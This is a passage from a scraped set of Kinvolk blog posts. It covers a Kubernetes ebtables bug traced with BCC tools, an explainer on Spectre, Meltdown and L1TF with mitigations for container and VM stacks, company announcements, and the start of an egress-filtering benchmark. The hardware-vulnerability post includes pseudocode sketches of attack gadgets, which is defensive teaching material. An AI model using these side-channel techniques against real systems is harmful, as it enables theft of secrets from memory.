e2:3f:9b:74:a8:7a -o veth+ --ip-src 10.2.207.0/24 -j DROP\n-p IPv4 -s e2:3f:9b:74:a8:7a -o veth+ --ip-src 10.2.207.0/24 -j DROP\n-p IPv4 -s e2:3f:9b:74:a8:7a -o veth+ --ip-src 10.2.207.0/24 -j DROP\n-p IPv4 -s e2:3f:9b:74:a8:7a -o veth+ --ip-src 10.2.207.0/24 -j DROP\n-p IPv4 -s e2:3f:9b:74:a8:7a -o veth+ --ip-src 10.2.207.0/24 -j DROP\n-p IPv4 -s e2:3f:9b:74:a8:7a -o veth+ --ip-src 10.2.207.0/24 -j DROP\n-p IPv4 -s e2:3f:9b:74:a8:7a -o veth+ --ip-src 10.2.207.0/24 -j DROP\n-p IPv4 -s e2:3f:9b:74:a8:7a -o veth+ --ip-src 10.2.207.0/24 -j DROP\n(...) The same rule is repeated thousands of times in the KUBE-DEDUP chain. This\nmeans that each network packet will be evaluated against that rule thousands of\ntimes. The chain name KUBE-DEDUP suggests that it was not a rule added\nmanually but programmatically by Kubernetes. This looks like a bug. Searching in the Kubernetes sources, I found that the kubenet network plugin\nused in the Kubernetes cluster indeed adds such a rule, but there is a function\nthat specifically checks if the rule is already added, to avoid adding it\nseveral times. Obviously, there is something wrong with that check. At this point, in order to see how kubenet is using ebtables exactly, I turned\nto another BCC tool: execsnoop .\nThis traces new processes and displays the command line for each of them. Since\nI am only interested in the ebtables process, I just add a grep ebtables and let this run for an afternoon until I see kubenet executing ebtables. docker run --rm -ti --privileged \\\n    --net=host --pid=host \\\n    -v /usr/src:/usr/src \\\n    -v /lib/modules:/lib/modules \\\n    -v /sys/kernel/debug:/sys/kernel/debug \\\n    docker.io/kinvolk/bcc \\\n    /usr/share/bcc/tools/execsnoop  \\\n        | grep ebtables After a few hours, I get some interesting output: ebtables         5260   2411     0 /sbin/ebtables --version\nebtables         5261   2411     0 /sbin/ebtables -t filter -L KUBE-DEDUP\nebtables         5262   2411     0 /sbin/ebtables -t filter -L OUTPUT --Lmac2\nebtables         5263   2411     0 /sbin/ebtables -t filter -L KUBE-DEDUP --Lmac2\nebtables         5264   2411     0 /sbin/ebtables -t filter -L KUBE-DEDUP --Lmac2\nebtables         5265   2411     0 /sbin/ebtables -t filter -A KUBE-DEDUP -p IPv4\n                      -s e2:3f:9b:74:a8:7a -o veth+ --ip-src 10.2.207.1/24 -j DROP We see kubenet listing the rules in the KUBE-DEDUP chain, and then proceeding\nto add the rule. However, the rule shown in the command line is slightly\ndifferent from the rule listed above: kubenet adds 10.2.207.1/24 but then\nebtables lists 10.2.207.0/24 . If you’re familiar with netmask , you’ll know that ebtables\nis doing the right thing to discard the final “.1” on a /24 netmask. Here is\nwhat’s happening: Kubenet lists the rules to check if the rule with 10.2.207.1/24 is there. Kubenet does not find it in ebtables -L ’ output because it lists the rules with 10.2.207.0/24 . So Kubenet runs the ebtables -A command to append a new rule. ebtables parses the rule, discards the .1 and appends the rule with 10.2.207.0/24 . Each time this process is repeated, a new rule is added. Over time, the rule can be repeated thousands of times. I reported the bug at https://github.com/kubernetes/kubernetes/issues/89633 with the links to the lines of code that cause the issue. The bug was\nintroduced in v1.16.0 and fixed in v1.18.0 with backports in v1.16.8 and\nv1.17.3. For Smartclip, the issue is resolved by upgrading to a Kubernetes version with\nthe fix. Monitoring on the ebtables rules list was also added in order to\ntrigger an alert when the amount of rules is excessive, just in case this issue\nhappens again. Bringing the BCC CPU profiler into Inspektor Gadget When managing a cluster in production, it is good practice to focus on\nautomation and avoid interacting with individual nodes, individual pods or\nindividual processes. However, in order to investigate the issue, I needed SSH\naccess to the Kubernetes nodes and I identified the pod with fluentd and its\nmain PID. Then I launched a new container containing the BCC tools and executed\nthe CPU profiler on the fluentd PID. This is error-prone and more complicated\nthan it could have been. Inspektor Gadget exists in order to make this process easier for Kubernetes\nsystem administrators. You can now achieve everything I did from the kubectl\ncommand line with kubectl gadget profile without needing to SSH to the nodes.\nThe execsnoop BCC tool is also available via kubectl gadget execsnoop . Under\nthe hood, Inspektor Gadget will execute the BPF programs on the nodes to get\ntraces from the right pods which can be selected with Kubernetes labels — no\nneed to SSH into the nodes, nor to work out the PIDs you need to attach the BPF\nprogram to. Following this investigation, we released a new version of Inspektor\nGadget including both profile and execsnoop . We also show examples how to use profile and execsnoop . As René Wagner, technical director data platforms at Smartclip, summarized the\nengagement: “Through their knowledge of the latest Linux kernel technologies,\nthe Kinvolk Labs team got to the bottom of our problem in a couple of days. We\nwere really impressed by their expertise and recommend their services to anyone\nin a similarly challenging situation. As a bonus outcome from the project, we\nare also really happy to have discovered Inspektor Gadget, which is now an\nessential tool for all our Kubernetes admins.” If you have used Inspektor Gadget and find it useful, or have a suggestion for\na useful gadget we could add, please let us know , or\n(even better) let the world know (tweet @kinvolkio with #InspektorGadget).", "date": "2020-04-24"},
{"website": "Kinvolk", "title": "Hardware vulnerabilities in cloud-native environments", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Thilo Fromm\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2019/03/hardware-vulnerabilities-in-cloud-native-environments/", "abstract": "The Spectre/Meltdown family of information disclosure vulnerabilities—including\nthe more recent L1 Terminal Fault (aka “Foreshadow”)—are a new class of\nhardware-level security issues which exploit optimizations in modern CPUs that\ninvoluntarily leak information. This potentially has a subtle impact on\ncontainer workloads, particularly in a virtualized environment. This post will\nlook at the individual OS abstraction levels of a generic container stack, and\ndiscuss risks and mitigations in a variety of scenarios. Let’s start with\ndescribing what we’ve labelled “generic container stack” above. We’ll use this\nmodel throughout the document to illustrate various threat scenarios. Whether\nwe operate our own infrastructure (bare metal, VMWare, OpenStack, OpenNebula,\netc.), or are customers of an IaaS (GCE, EC2) or PaaS (GKE, AKS) offering, we\nshould know the implications of Spectre/Meltdown to the stack we are using.\nThis will allow us to ensure the security of our cluster, be it through direct\naction, or through qualified inquiries to our service providers. Meet our stack: At the lowest level is your application, as our smallest - atomic - unit. Typically, we deal with individual applications running with container\nisolation. Nothing much changes in our picture so far. To run workloads in parallel, operators may opt to put a number of containers\ninto a sandbox, most commonly a virtual machine. Virtualization, apart from\nisolation, also abstracts from the hardware level, easing maintenance\noperations. Some implementations skip this virtualization layer - we’ll look at\nthe implications (not necessarily negative) further below. IaaS operators aim to consolidate their physical hardware, so bare metal hosts\nare filled with a number of sandboxes to saturate CPU and I/O. While sandboxing traditionally isolates containers from traditional attacks\nthat exploit flaws in applications’ implementations, the underlying physical\nhost’s CPU introduces new attack vectors. A brief recap of Meltdown, Spectre, L1TF, and related attacks Now that we have a mental model of our target environment, let’s consider the\nactual class of attacks we’re dealing with. Spectre, Meltdown et al. are a new\ncategory of security vulnerabilities that exploit side effects of CPU\noptimizations for code execution and data access. Those\noptimizations—speculative execution of instructions—were originally meant to\nrun hidden, without any user-visible impact on CPU execution states. In 2018,\nthe general public learned that there are indeed observable side effects,\nexploitable by priming a CPU’s speculative execution engine. This creates a\nside channel for the attacker to draw conclusions on the victim’s workload and\ndata. While we will only briefly discuss the attacks, Jon Masters’ presentation and slides on\nSpectre/Meltdown provide an excellent and thorough introduction. The family of attacks work against applications that run on the same\ncore as well as applications running on the other sibling of a hyperthreaded\ncore. It requires exploitable segments suitable for leaking information\n(“gadgets”) in the victim’s code. Overall, the family of hardware information\ndisclosure vulnerabilities, so far, includes: v1, the original v2, with branch prediction priming independent from the code attacked v3 and v3a aka “Meltdown” v4, bypassing stores and leaking “scrubbed” memory Level 1 Terminal Fault, or “Foreshadow” How does this work? Imagine you have a “shadow CPU” that mimics your real one. To be precise, the\nshadow only executes load and store memory instructions but no arithmetic\ninstructions. Shadow executes loads from memory before your real CPU gets to\nsee those load instructions, while the real CPU is busy performing arithmetic\ninstructions. Shadow loads very aggressively even in cases where it is likely,\nbut not guaranteed, that the load is even necessary. Its motivation is to make\ndata available in the CPU caches (fast access) instead of making the real CPU\nwalk to memory (orders of magnitude slower).  Eventually, the execution flow of\nthe real CPU arrives at where the shadow already is - and the data it needs is\nreadily available from the CPU caches. If the shadow CPU was wrong with its\nspeculation, there’s no harm done since values in the cache cannot be read.\nHarm is done though when code uses the data loaded to calculate an address in a\nfollow-up load instruction: if (offset < uper_bound_of_memory_allowed_to_access) { // attack uses offset > allowance char secret_data = * ( char * )(secret_memory_ptr + offset); // never reached by “real” CPU unsigned long data2 = my_own_array[secret_data]; // never reached by “real” CPU } // TODO: use cache timing measurement to figure out which index of “my_own_array” was loaded // into cache by “shadow”. This will reveal “secret_data”. Spectre - the keyhole The Spectre family of attacks—which includes Meltdown, discussed below—allow an\nunprivileged attacker to access privileged memory through speculative\nexecution. Privileged memory may be OS (kernel) memory of its own process\ncontext, or private memory belonging to another application, container, or VM. Spectre v1 The attack works by first training the branch predictor of a core to predict\nthat specific branches are likely to be taken. A branch in this case is a\nprogram flow decision that grants or denies execution of sensitive code based\non a value provided by the attacker—for instance, checking if an offset is\nwithin a legally accessible memory range. Branch predictor priming is achieved\nby performing a number of “legal” requests using valid offsets, until the\nbranch predictor has learned that this branch usually enters the sensitive\ncode.  Then, the attacker attempts an illegal access as outlined above which will be denied. ut at that point,\nthe speculative execution engine will have executed the access, using an\nillegal offset, and contrary to its design goal can be forced to leave an\nobservable trace in the core’s cache. The sensitive code is speculatively\nexecuted because the branch predictor has seen that branch go into the\nsensitive code so many times before. But we cannot access the cache, so what\ngives? The attacker’s code, while incapable of accessing the privileged data directly,\nmay use it in a follow-up load operation, e.g. as an offset to load data from\nvalid memory. Both reading the privileged data (I) and accessing a place in the\nattacker’s valid memory range using that privileged data as an offset (II) will\nbe speculatively executed. After the illegal access has been denied, the\nattacker checks which memory offset from (II) is now cached. This will reveal\nthe offset originating from (I), which reveals the privileged data. Spectre v2 Spectre v2 builds on the fact that for indirect branches the branch predictor\nuses the branch target’s memory addresses to keep track of probabilities for\nindirect branches, and that it uses the virtual addresses of branch targets.\nThe attacker can thus train the branch predictor to speculatively execute\nwhatever is desired by crafting an environment that’s reasonably similar to the\nvictim code in the attacker’s own virtual address space.  This means the\nattacker can prime the branch predictor without ever calling the actual victim\ncode. Only after priming is finished will the victim code be called, following\na scheme similar to v1 to extract information. This lowers the restrictions of\nSpectre v1 with regard to exploitable victim code and makes the Spectre attack\nmore generic and flexible. Attacker Code: if (my_offs < my_value) { // branch located at a similar vmm address as nop; // the code we later attack; we run this branch often, } // w/ legal offset, until priming completed Victim Code (“gadget”): if (offset < uper_bound_of_memory_allowed_to_access) { // victim code, called ONCE, w/ bad char secret_data = * ( char * )(secret_memory_ptr + offset); // offset - “real” doesn’t branch unsigned long data2 = my_own_array[secret_data]; // but “shadow” already spoiled cache } // TODO: use cache timing measurement to figure out which index of “my_own_array” was loaded // into cache by “shadow”. This will reveal “secret_data”. Spectre v4 and the SPOILER attack While v3 is discussed below, Spectre v4 only works when the attacker’s code\nruns in the same address space as the victim code, but with some extra\nfeatures. Spectre v4 leverages the fact that speculative reads may return “old”\nmemory contents that have since been overwritten by a new value, depending on\nthe concrete CPU series’ implementation of speculative reads. This allows\n“uninitialized” memory to be recovered for a brief amount of time even after it\nwas overwritten (e.g. with zeroes). Concrete applications of Spectre v4 include\nrecovering browser state information from inside a browser’s javascript\nsandbox, or recovering kernel information from within BPF code. SPOILER , a recently disclosed attack,\nmakes extended use of speculative read and write implementations and the fact\nthat only parts of the actual virtual memory address are being used by the\nspeculative load/store engine. The engine would consider two different\naddresses to be the same because it does not consider the whole of the address,\nleading to false positives in dependency hazard detection. SPOILER\nleverages this to probe the virtual address space, ultimately\nenabling user space applications to learn about their\nvirtual->physical address mapping. Since the advent of ROWHAMMER ,\nwhich lets attackers flip DRAM memory bits by aggressively writing\npatterns in neighboring memory rows, virt->phys mappings are\nconsidered security sensitive. Consequently, SPOILER, after learning\nabout its address mapping, applies ROWHAMMER and can this way change\nmemory contents without accessing it. Meltdown (Spectre v3) - the open door Meltdown is a variant of Spectre that works across memory protection barriers\n(Spectre v3) as well as across CPU system mode register protection barriers\n(Spectre v3a). While v1 and v2 limit the attack to memory that’s valid in at\nleast the victim’s process context, Meltdown will allow an attacker to read\nmemory (v3) and system registers (v3a) that are outside the attacker’s valid\nmemory range. Accessing such memory under regular circumstances would result in\na segmentation fault or bus error. Furthermore, Meltdown attacks do not need to\ninvolve priming branch predictors - these go straight to the price of reading\nfrom memory that should be inaccessible. For illustration, the following\nconstruct will allow arbitrary access of memory mapped into the address space\nof the application—for instance, kernel memory where a secret is stored that\nshould be inaccessible to user space: char secret_data = * ( char * )(secret_kernel_memory_ptr); // this will segfault unsigned long data2 = my_own_array[secret_data]; // never reached, b/c segfault // TODO: catch and handle SIGSEGV // then use cache timing measurement to figure out which index of “my_own_array” was loaded // into cache by “shadow”. This will reveal secret_data. The Meltdown attack is based on lazy exception checking in the implementation\nof speculative execution in most Intel CPUs since 2008 (newer series initially\nreleased in 2019 and newer should work around this issue), as well as some\nimplementations of ARM CPUs. When speculatively executing code, exceptions are\nnot generated at all (making the speculative execution engine more\nlightweight). Instead, the exception check only happens at speculation\nretirement time, i.e. when the speculation meets reality and is either accepted\nor discarded. With Meltdown—and contrary to Spectre v1 and v2—an attacker can craft their own\ncode to access privileged memory (e.g. kernel space) directly, without\nrequiring a suitable privileged function (“gadget”) to exist on the victim’s\nside. Level 1 Terminal Fault - the (virtual) walls come down L1TF once more leverages a CPU implementation detail of the speculative\nexecution engine and also does not rely on branch prediction, so it is pretty\nsimilar to Meltdown. It works across memory boundaries and it bypasses\nvirtualization. In fact, an L1TF attack is most powerful when attacking a bare\nmetal host from within a virtual machine of which the attacker controls the\nkernel.  The most basic L1TF attack would have an attacker’s application\nallocate memory, then wait for the memory pages to be swapped to disk—which\nwill have the kernel’s memory management flip the “invalid” bit in the\nrespective page’s control structure. The “invalid” bit in those control\nstructures—which are shared between the kernel and the CPU’s hardware memory\nmanagement unit—should cause two things: the page table entry being ignored by\nthe CPU, and the kernel fetching data from disk back into physical memory if\nthe page is accessed. However, in some implementations of speculative execution\n(most Intel CPUs from 2008 - 2018), the “invalid” bit is ignored. When the attacker now reads from memory on that swapped-out page, the\nspeculative execution engine will access actual memory content of a different\nprocess, or of the kernel (the content that replaced the attacker’s page after\nit was swapped to disk), and the attacker can easily retrieve those values by\nusing it as an offset for an operation on their own (not swapped) memory, and\nthen measuring access timings to figure out which value was cached.  While this\nattack is reasonably difficult to mount from an application—the attacker has no\ncontrol of either the page addresses or when/if the pages are swapped out—it\nbecomes all the worse when mounted from inside a VM. Inside a (otherwise unprivileged) VM controlled by an attacker, the VM may\nleverage a CPU mechanism called Extended Page Tables (EPT). EPT allows hosts to\nshare memory management work with guests. This results in a significant\nperformance boost for the virtual memory management, while allowing an attacker\nto craft suitable page table entries and mark those invalid directly, bypassing\nthe restrictions of the basic attack described above. A malicious VM exploiting\nL1TF would be able to read all of its physical host’s memory, including the\nmemory of other guests, with relative ease. Attack Scenarios After refreshing our memory on the mechanisms exploited to leak information via\notherwise perfectly reasonable optimizations, we’ll go ahead and see how we can\napply these attacks to the generic container stack we’ve built in the\nintroduction (which, if you just worked your way through the attack details,\nmust feel like ages ago). Operating System level This applies to a scenario where containers are run on bare metal, on a\ncontainer-centric OS. The OS provides APIs and primitives for deploying,\nlaunching, managing, and tearing down containerized applications. Potential\nvictims leaking information to a rogue application would be its own container\ncontrol plane, the OS part of its process context, and other containers running\non the same host. In order to ensure confidentiality, the container OS is\nrequired to ship with the latest security patches, and compiled with Retpoline\nenabled (a kernel build time option). Furthermore, it would need to have run-time mitigations enabled - IBRS, both\n(kernel+user space) for Spectre v2, page table isolation (PTI) for Meltdown,\nstore bypass disable (kernel+user space)\nfor Spectre v4, and Page Table Entry Inversion (PTE Inversion) for L1TF. IBRS is a bit Intel introduced to the machine specific register set of their\nCPUs . Security-focused Linux container OSs like Flatcar Linux enable such measures by\ndefault.  In order to further secure the container control plane from being\nspied on by its own application, the control plane and accompanying libraries\nneed to be compiled in a way that emits protective instructions around\npotential Spectre gadgets (e.g. -mindirect-branch=thunk , -mindirect-branch-register , -mfunction-return=thunk for gcc). Virtualization environments Virtualization environments suffer from an additional vector of attack that\nmakes it significantly easier for the attacker to craft page mappings that\nexploit L1TF, if the attacker is able to gain control of the guest kernel. We\nclassify virtualization environment in two categories. Restricted Virtualization environments (“no root”, unprivileged containers) Restricted virtualization environments, while providing virtualization services\nto container clusters, restrict access of the virtualization guest -\nunprivileged users are used for running workloads, and the guest OS kernel\ncannot be changed by a third party.\nThis approach requires that the operator remains in full control over both VMs\nand VM guest kernels at any point in time. Appropriate monitoring needs to be\nin place to ensure that a malicious application does not break out of its\nunprivileged container and subsequently receives access rights to mutate kernel\ncode. e.g. by loading custom kernel modules or even booting into a custom\nkernel. This would ultimately allow attackers to work around the PTE inversion\nrestriction in particular, but with significant security impact. With full control over VM and instance kernels, the Operating System\nlevel mitigations discussed in the previous section\nwill secure the stack. Unrestricted Virtualization environments (“got root”, privileged containers) Unrestricted virtualization environments, even when not “officially”  allowing\nfor custom kernels, provide root access to 3rd parties and therefore are at\nrisk of mutating changes to the kernel anyway, such as rogue module loads, or\neven booting a custom kernel. This will allow an attacker to craft custom page\ntable entries, greatly enhancing the impact of the L1TF attack in particular. From here on, working around those hardware vulnerabilities will hurt\nperformance. Keeping control of the guest kernel Before we discuss mitigations for a scenario where we don’t control the guest\nkernel, let’s have a look at our options for securing control even in\nprivileged environments. This mitigation ensures that the VM kernel cannot be\nmodified—e.g. through loading a kmod—or otherwise mutated, even with VM root\naccess available. A technical way to hide access to the VM kernel provided by\nsome virtualization systems (most notably qemu) is to use direct kernel\nboot —that is,\nstarting the guest with a kernel that is not on the VM filesystem image, but\npresent on the bare metal virtualization host and is provided to the hypervisor\nwhen a VM is started. Since VMs do not have access to host file systems, the VM\nkernel cannot be modified even if VM root access is available. This approach\nwould require the operator to provide and to maintain custom Linux kernel\nbuilds tailored for their infrastructure. Kernel module signing may be\nleveraged to guarantee “legal” kernel modules can still be loaded.  Security in\nthis scenario may be supported by operationalising direct kernel boot with\nthe virtualization stack—i.e. booting the VM into a kernel supplied on the bare\nmetal host instead of from the instance’s file system image, locking down\nloading of modules (monolithic kernel, or kmod signing), and removing kexec\nsupport. Security focused distributions like Flatcar Linux are working towards\nenabling locked-down kernel configurations like the above. With the guest kernel remaining firmly under the control of the operator, Operating System level mitigations like PTE\ninversion (which cannot be worked around from inside the VM’s user space) will\nonce more secure the system. Pinning VM CPUs (vCPUs) to physical CPUs (pCPU) In order to have VMs of varying trust levels continue to share the same\nphysical host, we might investigate ensuring that VMs never share the same L1\ncache. The technical way to achieve this is vCPU -> pCPU pinning. In this\nscenario, virtualization workloads must not be CPU over-committed - one virtual\nCPU equals one physical CPU, and each physical CPU serves the same VM.\nApplication level over-commitment, i.e. running more applications (or\ncontainers) inside of a VM than there are CPUs, may be applied to saturate\nsystem usage. Alternatively, VMs may be grouped by trust level, and the virtual\ncores of VMs of the same trust level may be pinned to the same group of\nphysical CPUs.  When the guest kernel cannot be controlled and we therefore\nneed to anticipate attacks from the VM kernel, we need to secure the physical\nhost’s OS as well as other VMs running on the same host. L1TF attacks mounted\nfrom VM kernels have significantly higher impact than malicious user space\napplications trying to leverage L1TF. Specific hardware acceleration in a CPU’s\nmemory management unit—EPT from above—allows guests to manage its page tables\ndirectly, bypassing the host kernel. EPT, while providing a significant\nspeed-up to VM memory management, poses a potential security risk for the bare\nmetal host’s OS, as page table entries suitable for exploiting L1TF can be\ncrafted directly. First, we need to take a step back though and reconsider sandboxing as in this\nscenario containers in the same VM cannot be considered isolated anymore.\nIsolation now happens solely at the VM level, implying that only containers of\nthe same trust level may share a VM—which is likely to cause repercussions on a\nclusters’ hardware saturation and maintenance operations.  With CPU pinning, a\nhost’s CPUs are statically partitioned into “VM slots”, and there’s a maximum\nnumber of VMs that can run on a host to ensure CPUs are never shared between\nVMs (or between trust levels). CPU pinning allows guest OS kernels to be in\ncontrol of 3rd parties without impacting the security of other VMs running on\nthe same physical host. To further secure the operating system of the physical host, which may also\nleak information via the L1 data cache  when the VM task-switches into the\nphysical host’s kernel via a hypercall, the L1 data cache needs to be flushed\nbefore the VM context is entered from the host OS. KVM provides a module\nparameter / sysctl that will flush caches, via the kvm-intel.vmentry_l1d_flush option (l1d for level-1 data cache). The option can be set to either “always”\nor “cond” (it can also be deactivated by supplying “never”). “always” will\nflush the L1 data cache every time a VM is scheduled off a CPU, while “cond”\nwill try to figure out whether a vulnerable code path was executed and only\nflush if required. This option will impact application performance as the L1D\ncache will need refilling after each schedule event, which it otherwise would\nnot—but since refilling will happen from the L2 cache, the overall performance\nimpact is expected to be mild. Securing the Virtualization runtime against L1TF If we cannot control the guest kernel, and if we also cannot pin vCPUs to pCPUs\nin a way that multiple VMs do not share L1 caches, we need to work around the\nL1TF hardware vulnerability by use of software mitigations at the\nvirtualization layer—that is, the bare metal host kernel and hypervisor. These\nmitigations will impact the overall system performance, though the level of\nimpact is application specific.  Software mitigation against L1TF is two-fold.\nBoth attack vectors need to be mitigated: Secure active VMs against attacks from other VMs being active at the same\ntime Secure L1 cache data of VMs that are becoming inactive from the next VM\nthat’s to use the same physical CPU, or by the host OS (see above). To mitigate 1., either the Hyperthreading or the EPT CPU feature needs to be\ndisabled on the physical virtualization host. While the performance impact is\napplication specific, overall performance gains published at the time the\nrespective technology was introduced suggest it may be less painful to disable\nHyperthreading over deactivating EPT. In any case, operators should monitor the\nimpact on their real-life workloads, and experiment with changing mitigations\nto determine the least painful measure. In order to prevent data leaks via the L1 cache after a VM was scheduled off a\npCPU, the L1 cache must be flushed before the next VM starts using that pCPU,\nsimilar to the physical OS protection discussed in the previous section. The\nsame mechanism via KVM’s kvm-intel.vmentry_l1d_flush option applies here. Future outlook / potential long-term options Caches and Hyperthreading in particular has been under sustained attack from\nthis new generation of hardware-level information disclosures, with security\nresearchers warning about potential inherent vulnerabilities, and e.g. the\nOpenBSD distribution disabling Hyperthreading completely for security reasons.\nHowever, even when factoring in the vulnerability drawbacks, valid use-cases\nfor hyperthreading remain. For example, a multi-threaded application, which\ndoes share its memory with its threads anay, would benefit without being\nvulnerable per se. However, currently no scheduler exists in the Linux kernel\nthat is advanced enough to perform this level of scheduling—appointing sets of\nprocesses or threads to a set of cores or hyperthreads of the same core, while\nlocking out all other processes from those cores. But something is in the works. A patch-set of no less than 60 individual\npatches proposed to the Linux kernel’s CFQ scheduler in September 2018 started\na discussion about adding co-scheduling\ncapabilities to Linux. While this particular patch-set appears to have been\nabandoned (with the discussion apparently concluded), the general direction of\nthis work continues to be pursued. More recently the maintainer of the Linux\nscheduler subsystem, Peter Zijlstra, proposed his own patch\nseries to tackle this feature . If you need help improving the security of your Kubernetes environment, please\ncontact us at [email protected] .", "date": "2019-03-08"},
{"website": "Kinvolk", "title": "Kinvolk welcomes Vincent Batts as CTO", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Alban Crequy\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/05/kinvolk-welcomes-vincent-batts-as-cto/", "abstract": "It’s my pleasure to announce that Vincent Batts has joined Kinvolk as Chief\nTechnology Officer. With a 15 year track record of open source contributions,\n‘vbatts’, as most folks know him, is visible across Linux, Docker, Golang and\nmany more communities. His focus centers around standards, packaging, software\nprovenance and distributions. Vincent also knows that open source is about\npeople, and he is well known for his superb ability to work with anyone and\neveryone. This is especially evident through his leadership in the Open\nContainer Initiative (OCI) , both as a\nmaintainer and on the Technical Oversight Board, and his successful\nfacilitation of projects in the Cloud Native Computing Foundation\n(CNCF) landscape. Vincent comes to us from Red Hat, where his work in the Office of the CTO\nrevolved around discovering emerging technologies in the container and cloud\nnative space. His individual contributions and subject matter expertise are\nvisible from the conference stage to enterprise customer briefings. My new domain, Kinvolk Labs With Vincent joining, I’ll be transitioning from CTO to leading our new Kinvolk Labs team. At Kinvolk, we’ve built a\nreputation for solving hard problems by applying our broad expertise at every\nlevel of the software stack. Kinvolk Labs is where we’ll be applying that\nknowledge to improve existing open source projects and creating innovative new\nones. I look forward to being able to devote more of my time to Labs projects\nand engaging with internal and external teams to make meaningful improvements\nacross the cloud native and Linux software stack. With the founding of Kinvolk Labs and Vincent joining as CTO, Kinvolk is taking\nits next big steps as a company. As we continue to grow, I and the rest of the\nKinvolk team are excited to see how Vincent applies his unique combination of\nskill set, experience and positive attitude to drive forward our product\nofferings, services, and community involvement.", "date": "2020-05-06"},
{"website": "Kinvolk", "title": "Container Linux: Back on Track with Flatcar", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Vincent Batts\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/05/container-linux-back-on-track-with-flatcar/", "abstract": "Yesterday, CoreOS Container Linux reached its end of life (EOL). Today marks the beginning of Flatcar Container Linux as an independent Linux distribution. With this comes a certain responsibility, but more notably: an opportunity for Kinvolk and the broader container community. Just after the EOL announcement this February, Chris wrote a post about what this would mean for Kinvolk and the Flatcar project . Now that the end-of-life has come to pass, I’d like to build on Chris’ post, go further into where we go from here, and the reasons I’m excited to be at Kinvolk. I joined Kinvolk very recently . In these first weeks I have spent most of my time speaking with the team, learning about what everyone is working on, and digging into the various Kinvolk projects. In doing so, I’ve formed a fuller picture and appreciation of what Kinvolk is doing as a company. Presence in upstream communities, contributions, and individual use of these technologies is made evident not only how they enhance the state-of-the-art, but also improve the proven patterns. Same stability, more rapid innovation As the original Container Linux, CoreOS introduced a means of delivering both rapid innovation and a stable and secure operating system. Since their acquisition, the stability has remained but the innovation has stagnated considerably. Thus, in this period, CoreOS Container Linux was only fulfilling half of its promise. Starting with its latest alpha release, Flatcar Container Linux is resuming this innovation aspect. This release will make its way via the standard channel promotion through beta and into the stable channel, bringing a newer kernel. This means for the first time in about 1.5 years, the stable channel is looking forward to more than just a patch release. Other major components like systemd and Docker will also be getting long-awaited updates. In effect, Flatcar is carrying the mantle of the original CoreOS user experience and fulfilling the expectations that were originally set. We have heard positive feedback from customers about the benefits of a slower pace Container Linux. This is valuable feedback. Stability is not something that should block access to innovation. Business as usual Resuming pace is the first step. There have been a number of changes in the container space in the past 2+ years. For example, rkt was archived, Ignition has changed, additional container runtimes have gained wider adoption, the next kernel LTS release has progressed, BPF has become more established, cgroup v2 has advanced, etc. Over the next months, expect updates to address these deprecations and advancements. We understand well that we can only do this by ensuring the stability part of the Container Linux promise. We are here for clients and community users to make sure this process goes smoothly. Join the mailing list or IRC. And, as always, file issues you find. Your active use of Alpha and Beta in diverse real-world environments is what makes Stable even better for you. Project roadmap This is a community project and we track plans in the project roadmap . If you are looking to know what is happening and how you can contribute to the Flatcar project with code or feedback, this is the place to watch 👀. What Flatcar Container Linux means to Kinvolk Kinvolk is a 100% open source company and is dedicated to staying that way. As a bootstrapped team (no outside investors) of engineers with experience from the kernel and systemd to networking, telemetry and service meshes and everything in-between, it is about as farm-to-table as you can get in the tech industry. This, and the very capable and friendly “volks” I get to work with, are what attracted me to join. This means Kinvolk can focus on building a sustainable, long-term business to deliver on its mission of an enterprise-grade Open Cloud Native stack. The Flatcar project is the foundational bedrock on which we build in fulfilling this mission. Of course, ultimately this must translate into revenue for us, if we are to be able to continue the substantial investment required to maintain Flatcar Container Linux and build a full Open Cloud Native stack on top of it. We believe it is possible to do this in a sustainable way, based on delivering value that end users appreciate, whether that is the insurance policy of an enterprise service-level agreement, hosted offerings like the Kinvolk Update Service, direct access to our team’s domain experts, or taking on custom development projects. The imperative to build a sustainable business, however, will never take away from our commitment to 100% open source solutions, and to supporting the wider cloud native community of which we are just a small part. Our stewardship of the heritage of CoreOS Container Linux is only one way this manifests itself. What all this all boils down to is that if you are looking for a way forward now that CoreOS has reached end-of-life, Kinvolk provides the ideal path via Flatcar Container Linux. But for new deployments, Flatcar holds as much promise as CoreOS once did. So hop on for the ride.", "date": "2020-05-27"},
{"website": "Kinvolk", "title": "Performance Benchmark Analysis of Egress Filtering on Linux", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Mauricio Vásquez\n    \n    \n    /\n    \n    \n  \n    \n    \n      Alban Crequy\n    \n    \n    /\n    \n    \n  \n    \n    \n      Imran Pochi\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/09/performance-benchmark-analysis-of-egress-filtering-on-linux/", "abstract": "Traffic filtering is a common technique used to protect networks and hosts from malicious activity. The\nfiltering can be done in the incoming and outgoing flows, better known as ingress and egress filtering. There\nare many examples of use cases for ingress filtering: mitigating DDoS attacks, avoiding SPAM, blocking access\nto services for specific geographic regions and so on. One common application of egress filtering is to prevent applications and users from reaching remote hosts.\nThese kinds of filters are usually based on a large deny-list of IP address ranges, like Reputation Block\nLists . The technology\nused to perform this task has to be able to handle a high number of restricted hosts, up to millions in some\ncases. Our friends at SAP asked us to perform a benchmark of the common Linux technologies available for this task.\nThis blog post presents the methodology and results from benchmarking some of the Linux filtering\ntechnologies: eBPF, IP sets and iptables. Update 2020-09-14: we have received some great feedback and suggestions about other options to try,\nincluding eBPF JIT optimization (that we left inadvertently disabled) and inline eBPF map lookup. We will take\na look at this and update this post as soon as possible. Update 2020-12-17: acting on the valuable feedback received, the latest test results by the benchmark are\ndone with the eBPF JIT compiler enabled. The results showed a marked improvement by enabling eBPF JIT\ncompiler. Latest versions of Flatcar Container Linux Alpha channel now come with eBPF JIT compiler enabled by\ndefault. Goals We had the following goals going into this study: Provide a reproducible benchmark framework that anyone else can download and use. Evaluate the different mechanisms in the Linux networking stack to filter out a large amount of IP addresses\nand assess their scalability when the amount of IP ranges to block reaches 1 million. Scenario We aim to understand the cost of performing egress filtering based on the destination IP in a large set of IP\nranges. The scenario we consider is composed of a client and a server computer that communicate through an IP 